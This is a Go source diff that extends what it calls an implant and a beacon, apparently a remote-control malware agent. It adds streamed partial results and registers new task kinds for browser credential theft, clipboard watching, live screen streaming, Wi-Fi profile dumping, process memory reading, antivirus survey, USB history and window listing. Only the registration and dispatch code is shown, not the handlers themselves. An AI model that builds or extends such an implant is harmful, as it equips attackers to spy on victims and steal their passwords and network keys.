@@ -44,6 +44,13 @@ type Outcome struct {
 	Err string
 	// Extra are the fields the operator sees next to the output.
 	Extra map[string]any
+	// Chunks are the pieces of a streamed answer.
+	//
+	// A picture of the screen is bigger than a frame of the protocol, and
+	// a stream of them is bigger still.  The beacon sends every chunk as
+	// a partial result -- the task stays open while the chunks travel --
+	// and the final result closes it.
+	Chunks [][]byte
 }
 
 // Capabilities is the list of the task kinds this implant can run.
@@ -70,6 +77,15 @@ func Capabilities() []any {
 		"sysinfo",
 		"tail",
 		"upload",
+		// The senses of the desktop.
+		"av.survey",
+		"browser.creds",
+		"clipboard.watch",
+		"proc.memory",
+		"screen.stream",
+		"usb.history",
+		"wifi.profiles",
+		"window.list",
 	}
 	out := make([]any, 0, len(kinds))
 	for _, kind := range kinds {
@@ -116,6 +132,22 @@ func (b *Beacon) runTask(kind string, args map[string]any) Outcome {
 		return b.taskPing(args)
 	case "exit":
 		return b.taskExit(args)
+	case "window.list":
+		return b.taskWindowList(args)
+	case "clipboard.watch":
+		return b.taskClipboardWatch(args)
+	case "screen.stream":
+		return b.taskScreenStream(args)
+	case "wifi.profiles":
+		return b.taskWifiProfiles(args)
+	case "browser.creds":
+		return b.taskBrowserCreds(args)
+	case "av.survey":
+		return b.taskAVSurvey(args)
+	case "usb.history":
+		return b.taskUSBHistory(args)
+	case "proc.memory":
+		return b.taskProcMemory(args)
 	default:
 		return Outcome{Code: 127, Err: fmt.Sprintf("%s %q", errUnknownKind.Error(), kind)}
 	}
